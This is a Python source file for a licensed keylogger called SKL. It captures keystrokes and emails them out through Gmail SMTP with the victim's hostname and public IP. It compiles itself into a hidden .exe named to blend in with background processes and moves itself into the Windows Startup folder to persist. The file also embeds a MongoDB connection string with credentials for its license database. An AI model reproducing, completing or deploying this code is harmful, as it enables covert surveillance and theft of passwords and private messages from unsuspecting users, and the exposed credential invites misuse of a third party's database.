
import os
import json
from pynput.keyboard import Key, Listener
import smtplib, ssl
import socket   
import requests
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import time
import threading


#!# -----------------------------------CONSTANTS----------------------------------- #!#


os.system("cls")


commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode", "test", "start", "status"]
modes = ["email", "local"]



class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'
    RESET_DIM = '\033[22m'
    WHITE = '\033[37m'


def printlogo():
    print(bcolors.FAIL+ """
    ░██████╗██╗░░██╗██╗░░░░░
    ██╔════╝██║░██╔╝██║░░░░░
    ╚█████╗░█████═╝░██║░░░░░
    ░╚═══██╗██╔═██╗░██║░░░░░
    ██████╔╝██║░╚██╗███████╗
    ╚═════╝░╚═╝░░╚═╝╚══════
        """)
    

SendMail = bool

keys = []
keys_pressed = 0


#!# -----------------------------------INJECTOR RELEATED----------------------------------- #!#

def isInjector():
    
    USER = os.getlogin()
    directory = "SKL"
    parent_dir = f"C:/Users/{USER}/AppData/Roaming"
                    
    path = os.path.join(parent_dir, directory)
    try:
            os.mkdir(path)
    except:
            pass
    try:
            with open(f"{path}/config.json","r") as f:
                json.load(f)
    except:
            with open(f"{path}/config.json","w") as r:
                pass

    JsonPath = f"{path}/config.json"
    
    
    try:
        with open(f"{JsonPath}","r") as f:
            parsed = json.load(f)
            try:
                injector = parsed["Injector"]
                if injector == True:
                    return 1
            except:
                pass
            
            
    except:
        pass
    try:
        if os.path.exists("inject.json"):
            return 5
    except:
        return False
    




    


USER = os.getlogin()
directory = "SKL"
parent_dir = f"C:/Users/{USER}/AppData/Roaming"
                
path = os.path.join(parent_dir, directory)
try:
        os.mkdir(path)
except:
        pass
try:
        with open(f"{path}/config.json","r") as f:
            json.load(f)
except:
        with open(f"{path}/config.json","w") as r:
             new = {'sender_email': 'sender', 'receiver_email': 'receiver', 'sender_password': 'password', "mode": 'mode'}
             json.dump(new,r)

JsonPath = f"{path}/config.json"
    
#!# -----------------------------------CONFIG CODE----------------------------------- #!#


class newConfig():


    def print_data():
        with open(f"{JsonPath}","r") as pf:
            return json.load(pf)
        

    def edit_data():
        with open(f"{JsonPath}", "r") as ef:

            parsed = json.load(ef)
            try:
                Mode = parsed["mode"]
            except:
                pass
           
     
            senderEmail = input(bcolors.FAIL + "Sender Email: "+ bcolors.WHITE)
            senderPassword = input(bcolors.FAIL + "Sender Password: "+ bcolors.WHITE)
            recieverEmail = input(bcolors.OKGREEN + "Receiver Email: " + bcolors.WHITE)

            with open(f"{JsonPath}", "w") as ev:           
                new = {'sender_email': senderEmail, 'receiver_email': recieverEmail, 'sender_password': senderPassword, "mode": Mode}
                json.dump(new,ev)
            
            print(bcolors.WARNING + "Data changed.")
            return bcolors.WHITE    
        
    def mode():
          os.system("cls")
          printlogo()
          with open(f"{JsonPath}", "r") as ef:

            parsed = json.load(ef)
           
            try:
                
                senderEmail = parsed["sender_email"]
                senderPassword = parsed["sender_password"]
                recieverEmail = parsed["receiver_email"]
            except:
                senderEmail = "senderEmail"
                senderPassword = "senderPassword"
                recieverEmail = "recieverEmail"

            print(bcolors.FAIL + "Please select, (email) or (local) mode")
            Mode = input(bcolors.WHITE + "")

            if Mode in modes:
                print(bcolors.WARNING + "Data Changed.")

                with open(f"{JsonPath}", "w") as ev:
                    new = {'sender_email': senderEmail, 'receiver_email': recieverEmail, 'sender_password': senderPassword, "mode": Mode}
                    json.dump(new,ev)

            else:
                input(bcolors.DIM + bcolors.FAIL + "Invaild Option, try again...")
                newConfig.mode()

            return bcolors.WHITE   

#!# -----------------------------------CAPS-LOCK----------------------------------- #!#

def CapsStatus():
    import ctypes
    return True if ctypes.WinDLL("User32.dll").GetKeyState(0x14) else False

     
#!# -----------------------------------LOGGER----------------------------------- #!#


def get_ip_address(mode):
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    hostname = socket.gethostname()
    if mode == None:
        return hostname, ip_address
    elif mode == "ip":
        return ip_address
        


def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):                     
  
 


    mode = parsed['mode']
        
    Key_mode = True
    Email_mode = False
        
    if mode == "email":
        Key_mode = False
        Email_mode = True
    elif mode == "local":
        Key_mode = True
        Email_mode = False
        
    def email(keysGiven):
        port = 465  # For SSL
        smtp_server = "smtp.gmail.com"
        sender_email = senderEmail
        receiver_email = receiverEmail  
        password = senderPassword
        message = f"""\
            Subject: KEYS 

        {keysGiven}."""

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)
 
 
#% ------------- KEY SYSTEM --------------- %#
    def on_press(key):
        global keys
        global keys_pressed  
        emailBool = False
        if key == Key.space:
            key = " "
        elif key == Key.backspace:
            key = ""
            keys = keys[: -2]
            keys_pressed =- 2
        elif key == Key.enter:
            key = "\n"
            emailBool = True
        elif key == "'":
            key = "_Apostro4phe_"
        elif key == "\x01":
            key = ""
        elif str(key).startswith("Key."):
            key = ""
            keys_pressed =- 2
        
        
        if CapsStatus(): key = str(key); key = key.upper()  
        
        
#@ ------------- KEY MODE SYSTEM --------------- @#

        keys.append(str(key))
        keys_pressed += 1
        if keys_pressed > 20 and Key_mode == True:   
            file = open(f"./out/Spicy-Logs++", "a") 
            UNmessage = "".join(keys)
            message = UNmessage.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            file.write(str(message))
            keys_pressed = 0 
            keys = []
            
#& ------------- EMAIL MODE SYSTEM --------------- &#

        if emailBool == True and Email_mode == True:
            UNmessage = "".join(keys)
            message = UNmessage.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            email(message)
            emailBool = False
            keys = []
    def isMaillable():
        global SendMail
        try:
            host_Data = get_ip_address()
            email(f"Started Process || {host_Data}")
            SendMail = True 
        except:
            SendMail = False
            print(SendMail)
    with Listener(on_press=on_press) as listener :
        isMaillable()
        listener.join()




#!# -----------------------------------CONFIG RELATED----------------------------------- #!#

def check_config():
    try:
        with open(f"{JsonPath}") as f:
            data = json.load(f)
            try:
                senderEmail = data["sender_email"]
                senderPassword = data["sender_password"]
                receiver_email = data["receiver_email"]
            except:
                print(bcolors.FAIL + "Your configuration (emails/password) arent setup correctly.\nplease use \"config\" to set them up")
                return False
            try:
                mode = data["mode"]
                             
            except:
                print(bcolors.FAIL + "Your mode configuration is not setup properly.\nplease use \"mode\" to set it up")
               
                return False
    except Exception as e:
         print(bcolors.FAIL + "Critical error. Major file is missing from your computer.")
         print(e)
         return False
    return True



#%# -----------------------------------CONTROL PANEL----------------------------------- #%#




def __main__():
    print( bcolors.RESET_DIM +bcolors.WARNING + "SKL (Simple Key Logger)")
    CONSOLE = input(bcolors.WARNING + "Command: " + bcolors.WHITE)
    os.system("cls")
    printlogo()
    return_c = 1

    if CONSOLE.lower() not in commands_list:
        print(bcolors.DIM + bcolors.FAIL + f"INVAILD COMMAND || USER ERROR \n{CONSOLE} was not found....")
        print(bcolors.RESET_DIM + "type \"help\" for avaliable commands. \n\n")
        


    if CONSOLE.lower() == "help":
        os.system("cls")
        printlogo()
        print(bcolors.OKCYAN + "Here's a list of avaliable commands:" + "\n" + bcolors.FAIL + "(config) " + bcolors.DIM + "Change Sender & Receiver Emails" + "\n" +
               bcolors.RESET_DIM + "(compile) " + bcolors.DIM + "Compiles the project into a .exe to be used." + bcolors.RESET_DIM + 
               "\n(exit) " + bcolors.DIM + "Close the SKL Program" +
                 bcolors.RESET_DIM + "\n(emails) " + bcolors.DIM + "Shows your current saved config."+bcolors.RESET_DIM + "\n(Mode)" +
                 bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM + "\n(status) " + bcolors.DIM + "Checks the status of various things in the program")
        

    elif CONSOLE.lower() == "config":
        os.system("cls")
        printlogo()
        print(newConfig.edit_data())

    elif CONSOLE.lower() == "emails":
        os.system("cls")
        printlogo()
        print(bcolors.DIM + "Here's your current saved data.")
        print(bcolors.WHITE + bcolors.RESET_DIM)
        print(newConfig.print_data())

    elif CONSOLE.lower() == "exit": 
        os.system("cls")
        printlogo()
        print(bcolors.FAIL + "Exiting SKL...")
        print(bcolors.WHITE)
        quit()
        exit()

    elif CONSOLE.lower() == "compile":
        try:
            if check_config() == False:
                pass
            else:    
                print(bcolors.WARNING + "Please enter a name for your .exe file." + bcolors.DIM + "\nMake sure it blends in with other background processes (do not use spaces)." + bcolors.RESET_DIM)
                filename = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
                os.system("cls")
                printlogo()
                print(bcolors.WARNING + "Enter the file path of a logo" + bcolors.DIM + "\nIf you dont have a logo, just type NONE." + bcolors.RESET_DIM)
                logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
                if logo.lower() == "none": logo = logo.upper()
                os.rename("SKL.py", filename + ".py")
                os.system(f"pyinstaller -F -w \"{filename}\".py -i {logo.upper()}")
                os.rename(f"{filename}.py", "SKL.py")
                
                with open("./dist/inject.json", "w") as f:
                    with open(f"{JsonPath}", "r") as j:
                        parsed = json.load(j)
                        senderEmail = parsed["sender_email"]
                        senderPassword = parsed["sender_password"]
                        receiverEmail = parsed["receiver_email"]
                        mode = parsed["mode"]
                        configData = {"sender_email": senderEmail, "sender_password": senderPassword,
                                      "receiver_email": receiverEmail,
                                      "mode": mode, "Injector": True}
                        
                        json.dump(configData,f)
        except:
            print(bcolors.FAIL + "Failed to compile KeyLogger properly.")
    elif CONSOLE.lower() == "test":
        try:
            START_LOGGER()
        except:
            print("Something went wrong when loading the keylogger.")
            
    elif CONSOLE.lower() == "mode":
        os.system("cls")
        printlogo()
        print(newConfig.mode())
        
    elif CONSOLE.lower() == "status":
        status()
        
        
    if return_c == 1:
        bcolors.WHITE
        __main__()
        
        
        
#!# -----------------------------------STARTUP APP----------------------------------- #!#    

if isInjector() == 1 or isInjector() == 5:
    import shutil
    import sys 
    import getpass
    
    USER_NAME = getpass.getuser()
    Src = (sys.argv[0])
    Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
    try:
        shutil.move(Src, Dest)
    except:
        pass        
    
    
    
                
                
#&# ----------------------------------- DATA-BASE ----------------------------------- #&#

def connectToDatabase(returnItem):
    

    try:
        
        uri = "mongodb+srv://skl:4rcQtgbSZbyq5AIC@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"

        client = MongoClient(uri, server_api=ServerApi('1'))

        database = client.get_database("SKL-Keys")

        collection = database["serial-key"]

        cursor = collection.find_one("skl-program-serial-keys")
        serial_keys = cursor["skl-serial-key"]
  
        if returnItem == "collection":
            return collection
        elif returnItem == "serial-keys":
            return serial_keys
        elif returnItem == "database":
            return database

    except:
        print("Failed to connect to SKL database!\nAre you a registered user? Please contact voidy6059 on discord about this issue.")



def returnCollection(serial):
    coll = connectToDatabase("collection")
    serial_keys_name = "skl-serial-key"
    coll.update_one(
         {"_id": "skl-program-serial-keys"},
         {"$pull": {serial_keys_name: serial}}
     )
    database = connectToDatabase("database")
    coll2 = database["allowed-hosts"]
    USER_NAME = socket.gethostname()
    IP = get_ip_address("ip")
    coll2.insert_one(
        {"_id": USER_NAME,
        "ip_addr": IP})
    

def returnUserHostName():
    database = connectToDatabase("database")
    coll = database["allowed-hosts"]
    USER_NAME = socket.gethostname()
    IP = get_ip_address("ip")
    try:
        host = coll.find_one({"_id": USER_NAME, "ip_addr": IP})
        if host != None:
            return True
        else:
            return False
    except:
        return False
    
#!# -----------------------------------CONFIG RELATED----------------------------------- #!#
    
    
def status():
    
   
    if returnUserHostName():
        print(bcolors.OKGREEN + "License ✅")
    else:
        print(bcolors.FAIL +"License ❌")
        
    try:
        with open(f"{JsonPath}") as f:
                data = json.load(f)
                
                try:
                    mode = data["mode"]
                                
                except:
                    print(bcolors.FAIL + "Your mode configuration is not setup properly.\nplease use \"mode\" to set it up")
                   
                if mode == "email":
                
                    try:
                        senderEmail = data["sender_email"]
                        senderPassword = data["sender_password"]
                        receiverEmail = data["receiver_email"]
                    except:
                        print(bcolors.FAIL + "Your configuration (emails/password) arent setup correctly.\nplease use \"config\" to set them up")
                       
             
                
    
        def email(keysGiven):
            port = 465  # For SSL
            smtp_server = "smtp.gmail.com"
            sender_email = senderEmail
            receiver_email = receiverEmail  
            password = senderPassword
            message = f"""\
                Subject: KEYS 

            {keysGiven}."""

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message)
                
                
        if mode == "email":
            try:
                email("Status Check")
                print(bcolors.OKGREEN +"Email ✅")
            except:
                print(bcolors.FAIL +"Email ❌")
        else:
            pass
    except:
        print(bcolors.FAIL +"Email ❌")
    
    try:
        if connectToDatabase("database") != None:
            print(bcolors.OKGREEN + "Database ✅")
    except:
        print(bcolors.FAIL + "Database ❌")
        
    print(bcolors.OKBLUE + "\nStatus check complete.")
 
        
        
    
    
#@# -----------------------------------LICENSE----------------------------------- #@#

    

def license():
    serial_keys = connectToDatabase("serial-keys")
    
    try:
        if returnUserHostName():
           return True
        else:
            raise Exception
    except:
        pass
            
    
    printlogo()
    print(bcolors.WARNING +  "SKL is a Licensed Product" + bcolors.WHITE + "\nIf you have " + bcolors.FAIL + "not" + bcolors.WHITE + " purchased a serial key, please contact " 
          + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " on discord to purchase your serial key.\n")
    
    serial = input("Serial key: ")
    
    if serial in serial_keys:
            returnCollection(serial)
            return True
      
    else:
        return False
   

    
def isLicensed():
    license_status = license()
    if license_status:
        os.system("cls")
        print("....Welcome to SKL....\nType \"help\" for a list of commands")
        printlogo()
        __main__()
    else:
        print(bcolors.FAIL + "Invaild serial " + bcolors.WHITE + "|| please contact " + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " to " + bcolors.OKGREEN + "purchase." + bcolors.WHITE)
        exit()
           

#%# -----------------------------------INJECTOR----------------------------------- #%#

if isInjector() == 1:
    with open(f"{JsonPath}", "r") as Config:
        parsed = json.load(Config)
        JsenderEmail = parsed["sender_email"]
        JsenderPassword = parsed["sender_password"]
        JreceiverEmail = parsed["receiver_email"]
        Jmode = parsed["mode"]
        configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
                        "receiver_email": JreceiverEmail,
                        "mode": Jmode, "Injector": True}
         
                              
    START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
        
        
elif isInjector() == 5:
    
    with open(f"inject.json", "r") as Inject:
        parsed = json.load(Inject)
        Injector = parsed["Injector"]
        if Injector == True:
            with open(f"{JsonPath}", "w") as Config:
                    JsenderEmail = parsed["sender_email"]
                    JsenderPassword = parsed["sender_password"]
                    JreceiverEmail = parsed["receiver_email"]
                    Jmode = parsed["mode"]
                    configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
                                            "receiver_email": JreceiverEmail,
                                            "mode": Jmode, "Injector": True}
                                
                    json.dump(configData,Config)   
    os.remove("inject.json")            
    START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
else:                    
   isLicensed()

isLicensed()


print(bcolors.WHITE)
       
       
